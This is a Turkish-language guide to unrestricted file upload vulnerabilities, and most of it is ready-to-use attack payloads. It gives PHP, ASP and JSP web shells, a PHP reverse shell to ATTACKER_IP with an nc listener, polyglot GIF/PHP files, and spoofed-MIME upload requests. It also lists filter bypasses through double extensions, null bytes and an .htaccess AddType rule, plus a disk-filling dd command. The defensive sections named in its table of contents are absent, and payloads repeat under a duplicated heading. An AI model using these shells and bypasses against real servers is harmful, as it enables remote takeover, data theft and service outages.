# 📂 Unrestricted File Upload Rehberi (2025)

---
## 📑 İçerik
- [Giriş](#-giriş)  
- [Dosya Yükleme Açıklarının Temel Mantığı](#-dosya-yükleme-açıklarının-temel-mantığı)  
- [Dosya Yükleme Açık Türleri](#-dosya-yükleme-açık-türleri)  
- [Temel Saldırı Senaryoları](#-temel-saldırı-senaryoları)  
- [Payload Örnekleri](#-payload-örnekleri)  
- [WAF / Filtre Bypass Teknikleri](#-waf--filtre-bypass-teknikleri)  
- [Tespit Yöntemleri](#-tespit-yöntemleri)  
- [Unrestricted File Upload ile Olası Saldırılar](#-unrestricted-file-upload-ile-olası-saldırılar)  
- [Önleme Yöntemleri](#-önleme-yöntemleri)  
- [Test Ortamları](#-test-ortamları)  
- [Kaynaklar](#-kaynaklar)  

---

## 🎯 Giriş
Unrestricted File Upload (Sınırsız Dosya Yükleme), web uygulamalarında **kullanıcının yüklediği dosyaların doğru şekilde doğrulanmaması** sonucu oluşan kritik bir güvenlik açığıdır.  

Bu açık sayesinde saldırganlar, sisteme zararlı dosyalar yükleyebilir ve şu riskler ortaya çıkabilir:
- **Web Shell** yükleyerek uzaktan komut çalıştırma (RCE)  
- **XSS veya HTML injection** barındıran dosyalarla saldırı  
- **Malware / Trojan** yükleyerek kullanıcıları enfekte etme  
- **Dosya taşıma / overwrite** ile sistemdeki mevcut dosyaları bozma  

Özellikle dosya yükleme fonksiyonlarının sıkça kullanıldığı alanlarda (profil resmi yükleme, belge yükleme, CV yükleme vb.) bu açık çok kritik hale gelir.  

📌 OWASP’ın en tehlikeli açıklar listesinde **yüksek riskli** kategoridedir çünkü genellikle **uzaktan sistem ele geçirme** (Remote Code Execution - RCE) ile sonuçlanır.  

---

## 🧩 Dosya Yükleme Açıklarının Temel Mantığı
Dosya yükleme açıklarının temel mantığı, **kullanıcının yüklediği dosyanın yeterince kontrol edilmeden sunucuya kaydedilmesi** durumudur.  

Normal şartlarda dosya yükleme süreci şu adımlarla güvenli olmalıdır:  
1. Dosya uzantısının kontrol edilmesi (.jpg, .png, .pdf vb.)  
2. MIME type kontrolü (Content-Type doğrulaması)  
3. Dosya boyut sınırı (örn: max 2 MB)  
4. Dosyanın güvenli bir klasöre kaydedilmesi (web root dışında)  
5. Dosya isminin sanitize edilmesi (özel karakterler temizlenmeli)  
6. Gerekirse dosyanın **içeriğinin** analiz edilmesi (örneğin antivirüs taraması)  

Ancak uygulamalarda genellikle şu zayıflıklar görülür:  
- Sadece **uzantı kontrolü** yapılır, içerik kontrol edilmez.  
- **MIME type** sadece istemci tarafında doğrulanır.  
- Dosya **web root** altında kaydedilir → direkt erişim mümkün olur.  
- Dosya isimleri kontrol edilmez → overwrite veya path traversal yapılabilir.  

Böylece saldırgan:  
- `.php`, `.asp`, `.jsp` gibi **script dosyaları** yükleyip çalıştırabilir.  
- `.html` dosyasıyla **XSS / phishing sayfası** barındırabilir.  
- Büyük dosyalar yükleyip **DoS (Disk dolumu)** saldırısı yapabilir.  

📌 Kısacası temel problem: **Yetersiz input validation ve insecure file handling**.  

---

## ⚔️ Temel Saldırı Senaryoları

Dosya yükleme açıkları, saldırganlara farklı yöntemlerle sistemi istismar etme imkanı sunar. Aşağıda en kritik senaryolar ve örnek payloadlar listelenmiştir.  

---

### 1. Web Shell Yükleme (Remote Code Execution - RCE)
Saldırgan yükleme formuna zararlı bir **PHP shell** yükleyerek doğrudan sunucuda komut çalıştırabilir.  

**Payload (shell.php):**
<?php system($_GET['cmd']); ?>

**Kullanım:**
http://hedefsite.com/uploads/shell.php?cmd=whoami  

**Sonuç:**
Sunucuda komut çalıştırma yetkisi elde edilir. Bu, dosya okuma/yazma, privilege escalation ve tüm sistem ele geçirme ile sonuçlanabilir.  

---

### 2. HTML/JS Dosyası ile XSS
Dosya yükleme alanına zararlı bir `.html` dosyası yüklenerek, site üzerinde XSS tetiklenebilir.  

**Payload (xss.html):**
<html><body><script>alert('XSS - File Upload')</script></body></html>

**Kullanım:**
http://hedefsite.com/uploads/xss.html  

**Sonuç:**
Kurban dosyayı açtığında tarayıcıda XSS çalışır. Çerez çalma, phishing sayfası açma gibi saldırılar yapılabilir.  

---

### 3. Zararlı Dosya ile Malware Bulaştırma
Saldırgan zararlı bir `.exe` veya `.pdf` dosyası yükler. Kullanıcı bu dosyayı indirip açtığında sistemine malware bulaşır.  

**Payload:**
evil.pdf (içine gömülü reverse shell exploit)  

**Kullanım:**
http://hedefsite.com/uploads/evil.pdf  

**Sonuç:**
Kurban dosyayı açtığında sistemine zararlı yazılım yüklenir. Bu yöntem phishing kampanyaları ile birleştirildiğinde çok etkilidir.  

---

### 4. Path Traversal ile Dosya Ezme
Dosya isimlerinin filtrelenmemesi durumunda saldırgan `../../` gibi dizin geçişleriyle sistem dosyalarını ezebilir.  

**Payload (filename):**
../../../../var/www/html/index.php  

**Kullanım:**
Resim yüklerken bu dosya adı verilirse, uygulamanın ana sayfası overwrite edilebilir.  

**Sonuç:**
Mevcut sistem dosyaları saldırganın yüklediği içerikle değişir. Örneğin ana sayfa deface edilebilir.  

---

### 5. Büyük Dosya Yükleme ile Disk Doldurma (DoS)
Dosya boyutu sınırı kontrol edilmediğinde saldırgan çok büyük boyutlu dosyalar yükleyebilir.  

**Payload:**
50GB dummy file  

**Kullanım:**
Arka arkaya devasa dosyalar yüklenir.  

**Sonuç:**
Disk alanı dolar, uygulama veya sunucu kullanılamaz hale gelir (Denial of Service).  

---

### 6. Polyglot Dosya ile Çift Amaçlı Saldırı
Saldırgan aynı dosya içinde hem resim hem script bulundurabilir. Bu sayede yükleme sırasında resim gibi görünür, çalıştırıldığında script olarak çalışır.  

**Payload (shell.jpg.php):**
GIF89a
<?php system($_GET['cmd']); ?>

**Kullanım:**
Dosya uzantısı `jpg.php` olursa bazı zayıf filtreler bunu resim gibi kabul eder.  

**Sonuç:**
Resim gibi görünen dosya aslında bir web shell olarak kullanılabilir.  

---

### 7. MIME Type Manipülasyonu
Sunucu sadece Content-Type headerına bakıyorsa saldırgan burayı manipüle edebilir.  

**Payload (HTTP Request):**
POST /upload HTTP/1.1
Content-Type: image/png
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>

**Kullanım:**
Dosya PHP shell içeriyor olmasına rağmen Content-Type image/png olduğu için kabul edilebilir.  

**Sonuç:**
Zararlı script çalıştırılabilir hale gelir.  

---

### 8. Double Extension ile Filtre Bypass
Bazı uygulamalar sadece ilk veya son uzantıya bakar.  

**Payload:**
shell.php.jpg  
shell.jpg.php  

**Kullanım:**
http://hedefsite.com/uploads/shell.php.jpg (sunucu tarafında PHP gibi yorumlanabilir)  

**Sonuç:**
Filtre atlatılarak script dosyası yüklenmiş olur.  

---

### 9. SVG Dosyası ile XSS
SVG dosyaları XML tabanlı olduğu için içine script gömülebilir.  

**Payload (evil.svg):**
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG')"></svg>

**Kullanım:**
http://hedefsite.com/uploads/evil.svg  

**Sonuç:**
Kurban SVG dosyasını açtığında tarayıcıda XSS tetiklenir.  

---

📌 Özet:  
Unrestricted File Upload açıkları sadece **sunucu tarafı RCE** için değil, aynı zamanda **istemci tarafı XSS**, **malware yayma**, **defacement**, **DoS** gibi birçok saldırı senaryosuna kapı aralar.  

---
## 🛠️ Temel Saldırı Senaryoları

Dosya yükleme açıklarının istismarında kullanılan payloadlar, saldırganın amacına göre değişiklik gösterir. Aşağıda en yaygın kullanılan örnekler listelenmiştir.  

---

### 1. Basit Web Shell Payload (PHP)
<?php system($_GET['cmd']); ?>

**Kullanım:**
http://hedefsite.com/uploads/shell.php?cmd=whoami  

**Sonuç:**
Sunucu üzerinde komut çalıştırılır.  

---

### 2. Reverse Shell Payload (PHP)
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>

**Kullanım:**
- Saldırgan kendi makinesinde `nc -lvnp 4444` ile dinleme yapar.  
- Yüklenen dosya çalıştırıldığında hedef sunucu saldırgana bağlanır.  

**Sonuç:**
Hedef sistemin kabuğu saldırganın eline geçer.  

---

### 3. ASP Web Shell
<%
Set oShell = CreateObject("WScript.Shell")
Set oExec = oShell.Exec(Request.QueryString("cmd"))
Response.Write(oExec.StdOut.ReadAll())
%>

**Kullanım:**
http://hedefsite.com/uploads/shell.asp?cmd=whoami  

**Sonuç:**
Windows tabanlı sunucuda komut çalıştırma.  

---

### 4. JSP Web Shell
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
try {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) { output += line + "\n"; }
} catch(Exception e) { output += e.toString(); }
out.println(output);
%>

**Kullanım:**
http://hedefsite.com/uploads/shell.jsp?cmd=whoami  

**Sonuç:**
Java tabanlı uygulamalarda RCE elde edilir.  

---

### 5. HTML Dosyası ile XSS
<html><body><script>alert('File Upload XSS')</script></body></html>

**Kullanım:**
http://hedefsite.com/uploads/xss.html  

**Sonuç:**
Tarayıcıda XSS tetiklenir.  

---

### 6. SVG Payload (XSS)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')"></svg>

**Kullanım:**
http://hedefsite.com/uploads/evil.svg  

**Sonuç:**
SVG dosyası açıldığında XSS çalışır.  

---

### 7. Polyglot Dosya (Hem Resim Hem PHP)
GIF89a
<?php system($_GET['cmd']); ?>

**Kullanım:**
Dosya `shell.jpg.php` gibi çift uzantılı yüklenir.  

**Sonuç:**
Hem resim gibi görünür hem de sunucu tarafından PHP olarak yorumlanır.  

---

### 8. Double Extension Payload
shell.php.jpg  
shell.jpg.php  

**Kullanım:**
Filtrelerin sadece ilk veya son uzantıyı kontrol etmesi durumunda yüklenebilir.  

**Sonuç:**
Zararlı dosya filtreyi bypass ederek yüklenir.  

---

### 9. MIME Type Manipülasyonu
HTTP isteğinde Content-Type değiştirilir.  

POST /upload HTTP/1.1  
Content-Type: image/png  
Content-Disposition: form-data; name="file"; filename="shell.php"  

<?php system($_GET['cmd']); ?>

**Kullanım:**
Sunucu sadece Content-Type headerına bakarsa PHP dosyası kabul edilir.  

**Sonuç:**
Zararlı script çalıştırılır.  

---

### 10. Büyük Dosya Payload (DoS)
Fuzzer veya `dd` komutu ile GB’larca boş dosya oluşturulup yüklenir.  

dd if=/dev/zero of=bigfile.txt bs=1M count=5000  

**Kullanım:**
bigfile.txt yüklenir.  

**Sonuç:**
Disk alanı dolar, servis kesintisi (DoS) oluşur.  

---

📌 Özet:  
Payload seçimi hedef platforma (PHP, ASP, JSP) ve güvenlik kontrollerine (uzantı filtresi, MIME doğrulama, içerik analizi) bağlıdır.  

---

## 🧨 WAF / Filtre Bypass Teknikleri

Dosya yükleme zafiyetlerinde genellikle uzantı, içerik veya MIME type üzerinden filtreleme yapılır. Ancak bu filtreler zayıf ya da hatalı uygulanırsa saldırganlar çeşitli tekniklerle bypass edebilir.  

Aşağıda yaygın kullanılan bypass yöntemleri ve örnek payloadlar listelenmiştir:  

---

### 1. Çift Uzantı Kullanımı
**Payload:**
shell.php.jpg  
shell.jpg.php  

**Kullanım:**
- Eğer sistem sadece ilk veya son uzantıyı kontrol ediyorsa dosya kabul edilebilir.  

**Sonuç:**
Dosya yüklenir ve sunucu tarafında PHP olarak çalıştırılır.  

---

### 2. Büyük Harf / Küçük Harf Değiştirme
**Payload:**
shell.PhP  
shell.PHP5  
shell.PhtMl  

**Kullanım:**
- Sunucu uzantı kontrolünü case-sensitive yapıyorsa filtre atlatılır.  

**Sonuç:**
Zararlı dosya yüklenebilir hale gelir.  

---

### 3. Null Byte (%00) Enjeksiyonu
**Payload (filename):**
shell.php%00.jpg  

**Kullanım:**
- Bazı eski sistemler `%00` karakterinden sonrasını yok sayar.  

**Sonuç:**
Sunucu dosyayı `.php` olarak işler.  

---

### 4. İkili Uzantı (Polyglot)
**Payload (shell.jpg.php içeriği):**
GIF89a
<?php system($_GET['cmd']); ?>

**Kullanım:**
- İçeriğin başına GIF header eklenir, böylece dosya resim gibi görünebilir.  

**Sonuç:**
Dosya hem resim hem script gibi davranır.  

---

### 5. MIME Type Manipülasyonu
**HTTP Request:**
POST /upload HTTP/1.1  
Content-Type: image/jpeg  
Content-Disposition: form-data; name="file"; filename="shell.php"  

<?php system($_GET['cmd']); ?>

**Kullanım:**
- Saldırgan Content-Type headerını `image/jpeg` yapar.  

**Sonuç:**
Sunucu dosyayı güvenli sanarak kabul eder.  

---

### 6. Çift Content-Type Header
**HTTP Request:**
Content-Type: image/jpeg  
Content-Type: application/x-php  

**Kullanım:**
- Sunucu tarafı hangi headerı dikkate aldığına göre PHP dosyası kabul edilir.  

**Sonuç:**
Zararlı dosya yüklenebilir.  

---

### 7. Bozuk Magic Bytes
**Payload:**
GIF89a<?php system($_GET['cmd']); ?>  

**Kullanım:**
- Dosya başına resim formatı magic bytes eklenir.  

**Sonuç:**
Antivirüs veya basit kontrol mekanizmaları atlatılabilir.  

---

### 8. White List Bypass (İzinli Formatı Kötüye Kullanma)
**Örnek:**
- `.svg` dosyaları izinli ise saldırgan şu dosyayı yükleyebilir:  

<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>  

**Sonuç:**
SVG formatı zararsız gibi görünür ama aslında XSS tetikler.  

---

### 9. HTACCESS ile MIME Manipülasyonu (Apache Sunucularda)
**Payload (.htaccess):**
AddType application/x-httpd-php .jpg  

**Kullanım:**
- Önce `.htaccess` yüklenir.  
- Sonra `evil.jpg` yüklenir, ama artık Apache bunu PHP gibi yorumlar.  

**Sonuç:**
Resim dosyası çalıştırılabilir script haline gelir.  

---

### 10. Çift Katmanlı Sıkıştırma
**Payload:**
evil.php.zip  
evil.php.rar  

**Kullanım:**
- Eğer uygulama sıkıştırılmış dosyaları açıyorsa içinden PHP shell çıkabilir.  

**Sonuç:**
Filtre bypass edilerek zararlı dosya sisteme sokulur.  

---

📌 Özet:  
Filtre bypass teknikleri genellikle **uzantı manipülasyonu**, **MIME spoofing**, **magic bytes ekleme** ve **çift uzantı** üzerine kuruludur. Bu yöntemlerle basit güvenlik kontrolleri kolayca atlatılabilir.  




